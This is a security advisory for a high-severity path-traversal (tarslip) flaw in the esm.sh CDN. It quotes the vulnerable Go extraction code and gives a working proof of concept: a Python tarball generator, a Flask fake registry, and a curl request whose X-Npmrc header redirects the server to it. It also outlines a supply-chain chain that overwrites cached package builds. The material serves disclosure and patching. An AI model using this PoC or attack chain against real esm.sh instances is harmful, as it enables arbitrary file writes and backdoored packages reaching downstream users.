# esm.sh CDN service has arbitrary file write via tarslip

**GHSA**: GHSA-h3mw-4f23-gwpw | **CVE**: CVE-2025-65025 | **Severity**: high (CVSS 8.2)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/esm-dev/esm.sh** (go): < 0.0.0-20251117232647-9d77b88c3207

## Description

### Summary
The esm.sh CDN service is vulnerable to a Path Traversal (CWE-22) vulnerability during NPM package tarball extraction.  
An attacker can craft a malicious NPM package containing specially crafted file paths (e.g., `package/../../tmp/evil.js`).  
When esm.sh downloads and extracts this package, files may be written to arbitrary locations on the server, escaping the intended extraction directory.

Uploading files containing `../` in the path is not allowed on official registries (npm, GitHub), but the `X-Npmrc` header allows specifying any arbitrary registry.  
By setting the registry to an attacker-controlled server via the `X-Npmrc` header, this vulnerability can be triggered.

### Details
**file:** `server/npmrc.go`  
**line:** 552-567

```go
func extractPackageTarball(installDir string, pkgName string, tarball io.Reader) (err error) {
    
    pkgDir := path.Join(installDir, "node_modules", pkgName)
    
    tr := tar.NewReader(unziped)
    for {
        h, err := tr.Next()
        // ...
        
        // Strip tarball root directory
        _, name := utils.SplitByFirstByte(h.Name, '/')  // "package/../../tmp/evil" → "../../tmp/evil"
        filename := path.Join(pkgDir, name)             // ← No validation
        
        if h.Typeflag != tar.TypeReg {
            continue 
        }
        
        // Extension filtering
        extname := path.Ext(filename)
        if !(extname != "" && (allowed_extensions)) {
            continue  // Only extract .js, .css, .json, etc.
        }
        
        ensureDir(path.Dir(filename))
        f, err := os.OpenFile(filename, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
        // ← File created without path validation!
        // ...
    }
}
```
The code uses `path.Join(pkgDir, name)`, which normalizes the path and allows sequences like `../../` to escape the intended package directory.

```
pkgDir: /esm/npm/evil-pkg@1.0.0/node_modules/evil-pkg
name:   ../../../../../../tmp/pyozzi.js
result:   /esm/npm/evil-pkg@1.0.0/node_modules/evil-pkg/../../../../../../tmp/pyozzi.js
        → /tmp/pyozzi.js  (path traversal)
```

### PoC
**Test On**
- esm.sh Official Docker Image (latest version)
- python 3.11
- flask (for attacker registry server)

### Step 1. Create Malicious tarball file
```python
#!/usr/bin/env python3
"""
Malicious Tarball Generator for esm.sh Path Traversal
Creates tarball with path traversal payloads
"""

import tarfile
import io,os
import json
from datetime import datetime

def create_malicious_tarball(package_name="test-tarslip"):
    
    # PoC file Content
    poc_payload = b"""// Path Traversal PoC
    // This file was created via tarslip attack
    // Location: /tmp/pyozzi.js

    console.log('[!!!] Path Traversal Successful!');
    console.log('Package: %s');
    console.log('Researcher: pyozzi');

    module.exports = {
        poc: true,
        vulnerability: 'CWE-22 Path Traversal',
        package: '%s'
    };
    """ % (package_name.encode(), package_name.encode())
    
    files = {
        "package/index.js": b"module.exports = { version: '1.0.0', test: true };",
        "package/package.json": json.dumps({
            "name": package_name,
            "version": "1.0.0",
            "description": "Test package for security research",
            "main": "index.js",
            "keywords": ["test", "security", "research"],
            "author": "Security Researcher",
            "license": "MIT"
        }, indent=2).encode(),
        
        "package/../../../../../../../../../tmp/pyozzi.js": poc_payload,
    }
    
    # Create Tarball
    
    tarball_name = f"{package_name}-1.0.0.tgz"
    
    print("Creating tarball with payloads:")
    print()
    
    with tarfile.open(tarball_name, "w:gz") as tar:
        for name, content in files.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            info.mode = 0o755
            info.mtime = int(datetime.now().timestamp())
            tar.addfile(info, io.BytesIO(content))

    print(f"File: {tarball_name}")
    print(f"Size: {os.path.getsize(tarball_name)} bytes")

    # Check Tarball Content
    print("Tarball contents:")
    with tarfile.open(tarball_name, "r:gz") as tar:
        for member in tar.getmembers():
            marker = ">> " if "../" in member.name else "   "
            mode = oct(member.mode)[-3:]
            print(f"{marker}{member.name} (mode: {mode})")

if __name__ == '__main__':
    create_malicious_tarball()
```

**output:**
```bash
 $ python create_tarball.py
Creating tarball with payloads:

File: test-tarslip-1.0.0.tgz
Size: 545 bytes
Tarball contents:
   package/index.js (mode: 755)
   package/package.json (mode: 755)
>> package/../../../../../../../../../tmp/pyozzi.js (mode: 755)
```

### Step 2. Run Fake Registry Server
```python
# fake-npm-registry.py
from flask import Flask, jsonify, send_file

app = Flask(__name__)

MALICIOUS_TARBALL = "/tmp/test-tarslip-1.0.0.tgz" # HERE MALICIOUS TAR PATH
REGISTRY_URL = "http://host.docker.internal:9999" # HERE FAKE REGISTRY SERVER

@app.route('/<package>')
def get_metadata(package):
    return jsonify({
        "name": package,
        "versions": {
            "1.0.0": {
                "name": package,
                "version": "1.0.0",
                "dist": {
                    "tarball": f"{REGISTRY_URL}/{package}/-/{package}-1.0.0.tgz"
                }
            }
        },
        "dist-tags": {"latest": "1.0.0"}
    })

@app.route('/<package>/-/<filename>')
def get_tarball(package, filename):
    return send_file(MALICIOUS_TARBALL, mimetype='application/gzip')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999)
```

```bash
python3 fake-npm-registry.py
```

### Step 3. Request Malicious Package with X-Npmrc Header
```bash
curl "http://localhost:8080/test-tarslip@1.0.0" \
  -H 'X-Npmrc: {"registry":"http://host.docker.internal:9999/"}'
```

### Step 4. Check Path Traversal
```bash
docker exec esm-test cat /tmp/pyozzi.js

# ouput:
// Path Traversal PoC
    // This file was created via tarslip attack
    // Location: /tmp/pyozzi.js

    console.log('[!!!] Path Traversal Successful!');
    console.log('Package: test-tarslip');
    console.log('Researcher: pyozzi');

    module.exports = {
        poc: true,
        vulnerability: 'CWE-22 Path Traversal',
        package: 'test-tarslip'
    };
...
```

### Impact
This vulnerability enables large-scale remote code execution on end-user endpoints through supply chain attacks. The path traversal vulnerability allows attackers to overwrite package resources stored in esm.sh's cache. Package lists and file paths can be discovered through esm.sh's REST API endpoints. By overwriting these resource files with malicious code, arbitrary code execution occurs on all endpoints that subsequently import the compromised packages.

**Attack Chain:**
1. Attacker identifies popular packages and their cached build file locations via API enumeration
2. Uses path traversal to overwrite cached build files (e.g., `/esm/storage/modules/react@18.3.1/es2022/react.mjs`)
3. Injects malicious code into the build files
4. Any application importing these packages receives the backdoored version
5. Malicious code executes on victim endpoints (browsers, Electron apps, Deno applications)

**Impact Scale:**
- Affects all downstream users of compromised packages
- Can target specific frameworks (React, Vue, etc.) used by thousands of applications
- Enables XSS in browsers, RCE in Electron applications
- Difficult to detect as traffic appears legitimate

### Patch
1. Path validation is required when unpacking a tar file.
2. `X-Npmrc` whitelist logic is required.
